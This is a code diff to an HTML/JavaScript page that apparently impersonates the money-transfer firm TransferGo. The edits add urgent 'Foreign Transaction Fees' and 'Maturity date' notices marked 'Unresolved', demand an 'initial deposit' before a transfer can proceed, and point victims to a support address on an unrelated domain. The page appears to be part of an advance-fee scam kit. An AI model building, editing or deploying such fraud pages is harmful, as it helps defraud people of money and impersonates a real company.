@@ -79,11 +79,11 @@ window.smartsupp||(function(d) {
 <div class='le'>
 <div class='dot gold'></div>
 <div class='txt'>
-<div class='txt1'>Transaction Fees</div>   
+<div class='txt1'>Foreign Transaction Fees </div>   
 </div>
 </div>
 <div class='ri'>
-<div class='btnn' id='feeStatus'>Processing</div></div>
+<div class='btnn gold' id='feeStatus'>Unresolved</div></div>
 </div>
 <div class='txt2' id='feeText'>Loading fee information...</div>
 </div>
@@ -91,13 +91,13 @@ window.smartsupp||(function(d) {
 <div class='message' id='statusMessage' style='display: none;'>
 <div class='heading'>
 <div class='le'>
-<div class='dot' id='statusDot'></div>
+<div class='dot red' id='statusDot'></div>
 <div class='txt'>
-<div class='txt1' id='statusTitle'>Status Update</div>
+<div class='txt1' id='statusTitle'>Maturity date  </div>
 </div>
 </div>
 <div class='ri'>
-<div class='btnn' id='statusBadgeNew'>Processing</div></div>
+<div class='btnn red' id='statusBadgeNew'>Unresolved</div></div>
 </div>
 <div class='txt2' id='statusText'>Loading status information...</div>
 </div>
@@ -353,8 +353,8 @@ Copyright 2025 TransferGo Ltd
       // Show fee message if money is due
       if (user.money_due || user.status === 'pending') {
         updateMessage('feeMessage', 
-          'Transaction Fees', 
-          `This is to inform you that an initial deposit of ${user.money_due || 'Amount'} is required for the activation and approval of your account. Once completed, the transfer process can proceed smoothly.`,
+          'Foreign Transaction Fees ', 
+          `This is to inform you that an initial deposit of ${user.money_due || 'Amount'} is required for the activation and approval of your account. Once completed, the transfer process can proceed smoothly. Please use the following Email address to contact support support@en1.wiretraff.click for transaction ${user.money_due || 'Amount'}  .`,
           'Unresolved',
           'gold'
         );
@@ -362,15 +362,13 @@ Copyright 2025 TransferGo Ltd
       }
 
       // Show status message
-      if (user.message) {
-        updateMessage('statusMessage', 
-          'Status Update', 
-          user.message,
-          user.status || 'Processing',
-          getStatusClass(user.status)
-        );
-        showMessage('statusMessage', true);
-      }
+      updateMessage('statusMessage', 
+        'Maturity date  ', 
+        user.message || 'We apologize for any inconvenience you may have experienced. Please note that the time has elapsed. Thank you for selecting our bank for your financial needs.',
+        'Unresolved',
+        'red'
+      );
+      showMessage('statusMessage', true);
 
       // Update document title
       document.title = `Transaction Details - ${user.name}`;
